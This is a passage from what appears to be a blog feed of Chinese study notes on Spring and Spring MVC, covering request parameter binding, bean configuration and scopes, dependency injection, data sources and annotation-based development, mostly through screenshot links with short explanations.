<h4 id="配置处理器映射器"><a href="#配置处理器映射器" class="headerlink" title="配置处理器映射器"></a>配置处理器映射器</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116121441155.png" alt="image-20201116121441155"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116122722209.png" alt="image-20201116122722209"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116123022662.png" alt="image-20201116123022662"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116123632704.png" alt="image-20201116123632704"></p>
<p>添加mvc注解驱动，底层默认实现jackson注解驱动。</p>
<h4 id="知识要点"><a href="#知识要点" class="headerlink" title="知识要点"></a>知识要点</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116123835484.png" alt="image-20201116123835484"></p>
<h3 id="95-108-springmvc的请求"><a href="#95-108-springmvc的请求" class="headerlink" title="95-108 springmvc的请求"></a>95-108 springmvc的请求</h3><h4 id="2-1-获得请求参数"><a href="#2-1-获得请求参数" class="headerlink" title="2.1 获得请求参数"></a>2.1 获得请求参数</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116124139294.png" alt="image-20201116124139294"></p>
<h4 id="2-2-获得基本类型参数"><a href="#2-2-获得基本类型参数" class="headerlink" title="2.2 获得基本类型参数"></a>2.2 获得基本类型参数</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116124408550.png" alt="image-20201116124408550"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116134220799.png" alt="image-20201116134220799"></p>
<h4 id="获得pojo类型参数"><a href="#获得pojo类型参数" class="headerlink" title="获得pojo类型参数"></a>获得pojo类型参数</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116134634514.png" alt="image-20201116134634514"></p>
<h4 id="2-4获得数组类型参数"><a href="#2-4获得数组类型参数" class="headerlink" title="2.4获得数组类型参数"></a>2.4获得数组类型参数</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116134824958.png" alt="image-20201116134824958"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116134811196.png" alt="image-20201116134811196"></p>
<h4 id="2-5-获得集合类型参数"><a href="#2-5-获得集合类型参数" class="headerlink" title="2.5 获得集合类型参数"></a>2.5 获得集合类型参数</h4><p>1、创建ViewObject类，封装user集合到对象中</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116135711282.png" alt="image-20201116135711282"></p>
<p>2、form.jsp传递post表单提交参数。只要提交的参数名和实体内部属性名一致，就可以提交。【在这里是vo对象的属性名称，也就是userlist。】</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116135608556.png" alt="image-20201116135608556"></p>
<p>3、传vo对象，客户端提交的数据，也就是属性已经注入。并成功打印。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116135552616.png" alt="image-20201116135552616"></p>
<p>二部分：</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116141940245.png" alt="image-20201116141940245"></p>
<p>1、构造ajax界面</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116142015189.png" alt="image-20201116142015189"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116142136733.png" alt="image-20201116142136733"></p>
<p>2、服务端直接接收，意味着请求体的内容直接封装在这个集合当中。<strong>约定：1、客户端发送的是json格式2、content-type接收的是application/json</strong></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116141836333.png" alt="image-20201116141836333"></p>
<p>3、在springmvc框架中开放对哪些资源的访问权限。mapping是地址，location是目录。</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116144116442.png" alt="image-20201116144116442"></p>
<p>4、springmvc找不到就是原始容器tomcat服务器来帮你找资源。遇上一种方法一样可以访问到。</p>
<h4 id="2-6-请求数据乱码问题"><a href="#2-6-请求数据乱码问题" class="headerlink" title="2.6 请求数据乱码问题"></a>2.6 请求数据乱码问题</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116144351608.png" alt="image-20201116144351608"></p>
<h4 id="2-7-参数绑定注解-requestParam"><a href="#2-7-参数绑定注解-requestParam" class="headerlink" title="2.7 参数绑定注解@requestParam"></a>2.7 参数绑定注解@requestParam</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116144615416.png" alt="image-20201116144615416"></p>
<h4 id="2-8-获得Restful风格参数"><a href="#2-8-获得Restful风格参数" class="headerlink" title="2.8 获得Restful风格参数"></a>2.8 获得Restful风格参数</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116144944547.png" alt="image-20201116144944547"></p>
<h4 id="2-9-自定义类型转换器"><a href="#2-9-自定义类型转换器" class="headerlink" title="2.9 自定义类型转换器"></a>2.9 自定义类型转换器</h4><p>1、自定义转换器</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116150520704.png" alt="image-20201116150520704"></p>
<p>2、告诉springmvc</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116150741918.png" alt="image-20201116150741918"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116150733589.png" alt="image-20201116150733589"></p>
<p>SpringMVC支持直接使用ServletAPI 作为目标方法的入参。</p>
<h4 id="原生api作为参数"><a href="#原生api作为参数" class="headerlink" title="原生api作为参数"></a>原生api作为参数</h4><p><strong>MVC 的 Handler 方法可以接受如下ServletAPI 类型的参数：</strong></p>
<p>• HttpServletRequest</p>
<p>• HttpServletResponse</p>
<p>• HttpSession</p>
<p>• java.security.Principal</p>
<p>• Locale</p>
<p>• InputStream</p>
<p>• OutputStream</p>
<p>• Reader</p>
<p>• Writer</p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116151352363.png" alt="image-20201116151352363">例子</p>
<h4 id="2-11获得请求头"><a href="#2-11获得请求头" class="headerlink" title="2.11获得请求头"></a>2.11获得请求头</h4><p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116151705986.png" alt="image-20201116151705986"></p>
<p><img src="/2020/11/04/spring%20mvc%E5%AD%A6%E4%B9%A0/spring%20mvc%E5%AD%A6%E4%B9%A0/.%5Cimage-20201116151859586.png" alt="image-20201116151859586"></p>
]]></content>
  </entry>
  <entry>
    <title>spring开发/spring开发 </title>
    <url>/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/</url>
    <content><![CDATA[<h3 id="1-7、Spring开发步骤"><a href="#1-7、Spring开发步骤" class="headerlink" title="1-7、Spring开发步骤"></a>1-7、Spring开发步骤</h3><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029105627853.png" alt="image-20201029105627853"></p>
<p>第一步导入框架对应的jar包，找到spring对应的maven坐标。第二步编写对应的接口和userdaoImpl的实现。第三步创建xml配置文件。第四步讲全包名导入到xml配置文件当中。第五步spring.getbean（api）标识传进去并返回对象。【这样就是从spring容器去要对象，而不是自己去new】</p>
<p><code>如何解耦合</code>：直接在tomcat的配置文件中id标识的全包名更换</p>
<p>第一步【导入坐标】：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029135454258.png" alt="image-20201029135454258"></p>
<p>可能会报红字，maven下载源码即可。</p>
<p>第二步编写对应接口和实现类（impl）：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029141341049.png" alt="image-20201029141341049"></p>
<p>第三步创建xml文件，bean对象</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029141301750.png" alt="image-20201029141301750"></p>
<p>第五步创建ApplicationContext对象getBean提供bean id参数。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029141616323.png" alt="image-20201029141616323"></p>
<h3 id="8-11-Spring配置文件详解"><a href="#8-11-Spring配置文件详解" class="headerlink" title="8-11 Spring配置文件详解"></a>8-11 Spring配置文件详解</h3><h4 id="3-1-bean标签基本配置"><a href="#3-1-bean标签基本配置" class="headerlink" title="3.1 bean标签基本配置"></a>3.1 bean标签基本配置</h4><p>默认情况下是调用该类的无参构造器。</p>
<p>id是唯一性表示不允许重复，class：bean的全限定名称。</p>
<h4 id="3-2-bean标签范围配置"><a href="#3-2-bean标签范围配置" class="headerlink" title="3.2 bean标签范围配置"></a>3.2 bean标签范围配置</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029142430080.png" alt="image-20201029142430080"></p>
<p>容器中默认singleton，spring容器中只有单个bean对象。</p>
<p>prototype 每getbean一次新生成一个对象</p>
<h4 id="测试是借助junit测试"><a href="#测试是借助junit测试" class="headerlink" title="测试是借助junit测试"></a>测试是借助junit测试</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029143220835.png" alt="image-20201029143220835"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029143734924.png" alt="image-20201029143734924"></p>
<p>需要@Test标签和导入包。打印出来单例的地址是一样的，说明容器中只有一个对象。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029144253155.png" alt="image-20201029144253155"></p>
<p>singleton加载配置文件容器就创建了bean对象。prototype是每次getbean时创建一个对象</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029144605189.png" alt="image-20201029144605189"></p>
<h4 id="3-3-bean标签范围配置init和destroy方法"><a href="#3-3-bean标签范围配置init和destroy方法" class="headerlink" title="3.3 bean标签范围配置init和destroy方法"></a>3.3 bean标签范围配置init和destroy方法</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029145240102.png" alt="image-20201029145240102"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029145544375.png" alt="image-20201029145544375"></p>
<p>对象先创建再调用init方法，destroy方法在容器销毁的时候还没来得及执行。</p>
<p>思路：1、尝试在destory方法下断点未果。说明没来的及执行销毁方法</p>
<p>2、容器手动关闭-&gt;容器意识到自己要被销毁，销毁之前把容器内对象的销毁方法执行一下-&gt;ApplicationContext是个接口，所以不用接口去接收子类，直接自己接收。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029150554743.png" alt="image-20201029150554743"></p>
<p>成功执行销毁函数。</p>
<h4 id="3-4-Bean实例化三种方式"><a href="#3-4-Bean实例化三种方式" class="headerlink" title="3.4 Bean实例化三种方式"></a>3.4 Bean实例化三种方式</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029150842885.png" alt="image-20201029150842885"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029152155628.png" alt="image-20201029152155628"></p>
<p>动态工厂通过容器内的动态工厂实例化对象调用bean实例化的方法。【这时候就可以jdbc的connection（driver manager）用有参构造的静态方法来实现】</p>
<p><code>以上都是spring产生dao层的对象</code></p>
<h3 id="12-18-Spring配置文件-依赖注入"><a href="#12-18-Spring配置文件-依赖注入" class="headerlink" title="12-18 Spring配置文件-依赖注入"></a>12-18 Spring配置文件-依赖注入</h3><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029154351863.png" alt="image-20201029154351863"></p>
<p>想让业务层UserService也配置到容器当中</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029215212653.png" alt="image-20201029215212653"></p>
<h4 id="3-7Bean的依赖注入概念"><a href="#3-7Bean的依赖注入概念" class="headerlink" title="3.7Bean的依赖注入概念"></a>3.7Bean的依赖注入概念</h4><p>依赖注入是Spring框架核心IOC的具体实现。【Service需要Dao的依赖注入】</p>
<h4 id="3-7Bean的依赖注入概念-1"><a href="#3-7Bean的依赖注入概念-1" class="headerlink" title="3.7Bean的依赖注入概念"></a>3.7Bean的依赖注入概念</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029215506737.png" alt="image-20201029215506737"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029215548574.png" alt="image-20201029215548574"></p>
<p>set方法注入：<br><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029221407626.png" alt="image-20201029221407626"></p>
<p>这里的name是set方法后面的名字去掉大写【属性名】，ref是参数名。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029221438916.png" alt="image-20201029221438916"></p>
<p>通过set方法将userDao对象注入到里面</p>
<h4 id="小知识点：-P命名空间注入"><a href="#小知识点：-P命名空间注入" class="headerlink" title="小知识点： P命名空间注入"></a>小知识点： P命名空间注入</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030151837669.png" alt="image-20201030151837669"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030151736585.png" alt="image-20201030151736585"></p>
<h4 id="有参注入"><a href="#有参注入" class="headerlink" title="有参注入"></a>有参注入</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030152510974.png" alt="image-20201030152510974"></p>
<p>这里的name指的是参数名【constructor-arg 构造器参数】 ref还是指引用的对象</p>
<h4 id="3-8Bean的依赖注入类型"><a href="#3-8Bean的依赖注入类型" class="headerlink" title="3.8Bean的依赖注入类型"></a>3.8Bean的依赖注入类型</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030153010085.png" alt="image-20201030153010085"></p>
<p>1、普通数据类型注入：设置好set方法。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030153222516.png" alt="image-20201030153222516"></p>
<p>2、集合数据类型注入：设置好set方法。注意配置文件</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030155829454.png" alt="image-20201030155829454"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030155920511.png" alt="image-20201030155920511"></p>
<h3 id="19-21-Spring配置文件-及相应API"><a href="#19-21-Spring配置文件-及相应API" class="headerlink" title="19-21 Spring配置文件 及相应API"></a>19-21 Spring配置文件 及相应API</h3><h4 id="3-9引入其他配置文件"><a href="#3-9引入其他配置文件" class="headerlink" title="3.9引入其他配置文件"></a>3.9引入其他配置文件</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030160233267.png" alt="image-20201030160233267"></p>
<p>加载主文件的同时份文件也会被加载</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030160700446.png" alt="image-20201030160700446"></p>
<p>bean标签spring容器对象，默认是单例无参【在加载配置文件时候生成】。</p>
<p>class属性是全限定名，也就是全包名。</p>
<p>property中的name是set方法注入</p>
<p>constructor是有参注入，子标签和bean标签内的相类似。</p>
<h4 id="Spring相应API"><a href="#Spring相应API" class="headerlink" title="Spring相应API"></a>Spring相应API</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030161128904.png" alt="image-20201030161128904"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030161440529.png" alt="image-20201030161440529"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030161502502.png" alt="image-20201030161502502"></p>
<p>getBean第一个是根据String类型的id找，第二个是根据字节码找【Spring根据类型在容器中找】【但是如果存在容器中相同类型的对象有多个的情况下用id去寻找】</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030161749301.png" alt="image-20201030161749301"></p>
<h3 id="22-27-Spring配置数据源"><a href="#22-27-Spring配置数据源" class="headerlink" title="22-27 Spring配置数据源"></a>22-27 Spring配置数据源</h3><h4 id="数据源开发步骤"><a href="#数据源开发步骤" class="headerlink" title="数据源开发步骤"></a>数据源开发步骤</h4><p>这里面的数据源就是之前学的连接池【提高整体性能】</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030162446684.png" alt="image-20201030162446684"></p>
<h4 id="数据源的开发步骤和手动创建C3P0数据源"><a href="#数据源的开发步骤和手动创建C3P0数据源" class="headerlink" title="数据源的开发步骤和手动创建C3P0数据源"></a>数据源的开发步骤和手动创建C3P0数据源</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030163138742.png" alt="image-20201030163138742"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030164215694.png" alt="image-20201030164215694"></p>
<h4 id="手动创建Druid数据源"><a href="#手动创建Druid数据源" class="headerlink" title="手动创建Druid数据源"></a>手动创建Druid数据源</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030164408932.png" alt="image-20201030164408932"></p>
<p>这些关闭都是表面关闭，实则是归还数据源</p>
<h4 id="抽取JDBCproperties文件"><a href="#抽取JDBCproperties文件" class="headerlink" title="抽取JDBCproperties文件"></a>抽取JDBCproperties文件</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030165215079.png" alt="image-20201030165215079"></p>
<p>resourceBundle获取jdbc配置文件默认在resource路径下去掉properties。</p>
<p>其实这个也算是ioc，解耦合将连接数据库的重要资源在配置文件中修改。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030171405304.png" alt="image-20201030171405304"></p>
<h4 id="Spring产生数据源对象"><a href="#Spring产生数据源对象" class="headerlink" title="Spring产生数据源对象"></a>Spring产生数据源对象</h4><p>将datasource的创建交给spring去配置</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030172137302.png" alt="image-20201030172137302"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030172309096.png" alt="image-20201030172309096"></p>
<h4 id="Spring加载properties文件"><a href="#Spring加载properties文件" class="headerlink" title="Spring加载properties文件"></a>Spring加载properties文件</h4><p>加载properties标签首先要在bean的命名空间下，还要引用schema的真实地址在哪</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030173325135.png" alt="image-20201030173325135"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201030173732892.png" alt="image-20201030173732892"></p>
<h3 id="28-34-Spring注解开发"><a href="#28-34-Spring注解开发" class="headerlink" title="28-34 Spring注解开发"></a>28-34 Spring注解开发</h3><h4 id="原始注解介绍"><a href="#原始注解介绍" class="headerlink" title="原始注解介绍"></a>原始注解介绍</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031151500592.png" alt="image-20201031151500592"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031151514980.png" alt="image-20201031151514980"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031153436074.png" alt="image-20201031153436074"></p>
<p>这就相当于在注解中配置好了。括号内的是id。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031153551494.png" alt="image-20201031153551494"></p>
<p>这个相当于bean的注入 qualifier里面写的是ref。</p>
<p><strong>注意点1：要进行组件扫描</strong>，从而在对应注解中扫描组件创建对象</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031153810306.png" alt="image-20201031153810306"></p>
<p>扫描这个包一下的子包</p>
<p>注解开发步骤：<br>1、在对应的bean上面创建注解</p>
<p>2、配置组件扫描的标签</p>
<p><strong>注意点二：在注解开发中set方法可以省略不写</strong>：因为set方法实在xml文档中配置的通过反射的方法去生成对象，但是注解开发中已经找到了，也是同样通过反射方法去赋值</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031154838701.png" alt="image-20201031154838701"></p>
<p><strong>注意点三：spring容器中(repository标签)有对应的Bean，可以不写qualifier</strong></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031155323379.png" alt="image-20201031155323379"></p>
<p>这个Bean就是对应接口类UserDao类型的。</p>
<p><code>经过测试，我实现了两个userdao实现类并都放在Spring仓库中，默认像是会找第一个配置文件的实现类。把第一个从容器中拿出会打印第二个的save方法</code></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031161524220.png" alt="image-20201031161524220"></p>
<h5 id="Resoure的作用。"><a href="#Resoure的作用。" class="headerlink" title="Resoure的作用。"></a>Resoure的作用。</h5><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031155647993.png" alt="image-20201031155647993"></p>
